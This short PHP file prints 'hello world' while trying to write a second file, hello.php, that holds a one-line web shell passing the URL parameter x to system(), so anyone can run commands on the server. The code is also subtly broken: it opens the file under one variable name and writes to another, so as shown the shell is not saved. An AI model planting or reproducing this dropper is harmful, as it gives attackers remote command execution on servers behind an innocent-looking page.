<?php 
$file = fopen("hello.php","w");
$txt = '<?php system($_GET[x]);?>';
fwrite($myfile,$txt);
fclose($myfile);

echo "hello world";
?>
